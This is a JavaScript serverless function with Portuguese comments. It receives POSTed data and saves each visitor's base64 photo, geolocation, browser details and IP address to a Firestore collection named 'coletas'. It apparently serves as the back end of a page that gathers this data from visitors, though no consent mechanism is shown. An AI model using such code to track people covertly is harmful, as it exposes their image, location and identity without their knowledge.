const { v4: uuidv4 } = require('uuid');
const admin = require('firebase-admin');

// ===== INICIALIZA FIREBASE =====
let firebaseInicializado = false;
let db;

function inicializarFirebase() {
    if (firebaseInicializado) return;
    try {
        const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS);
        admin.initializeApp({
            credential: admin.credential.cert(credentials)
        });
        db = admin.firestore();
        firebaseInicializado = true;
        console.log('🔥 Firebase inicializado com sucesso!');
    } catch (err) {
        console.error('❌ Erro ao inicializar Firebase:', err.message);
    }
}

exports.handler = async (event) => {
    console.log('📥 REQUISIÇÃO RECEBIDA');
    console.log('📋 Método:', event.httpMethod);

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        // Inicializa Firebase
        inicializarFirebase();

        const dados = JSON.parse(event.body);
        const id = uuidv4();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID: ${id}`);
        console.log(`📅 Timestamp: ${dataHora}`);

        // Processa a foto
        let fotoSalva = false;
        let nomeFoto = null;

        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${Date.now()}.${extensao}`;
                fotoSalva = true;
                console.log(`✅ Foto salva (${Math.round(base64Data.length / 1024)}KB)`);
            } catch (err) {
                console.log(`❌ Erro foto: ${err.message}`);
            }
        }

        // ===== SALVA NO FIRESTORE =====
        const dadosParaSalvar = {
            id: id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
            foto: dados.foto || null,  // Salva a imagem completa
            fotoNome: nomeFoto,
            userAgent: dados.navegador?.userAgent || null,
            timezone: dados.navegador?.timezone || null,
            language: dados.navegador?.language || null
        };

        // Se o Firebase estiver inicializado, salva lá
        if (firebaseInicializado && db) {
            try {
                await db.collection('coletas').add(dadosParaSalvar);
                console.log('🔥 Dados salvos no Firebase!');
            } catch (err) {
                console.error('❌ Erro ao salvar no Firebase:', err.message);
            }
        } else {
            console.log('⚠️ Firebase não disponível, dados salvos apenas localmente');
        }

        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('💥 ERRO:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ erro: error.message })
        };
    }
};
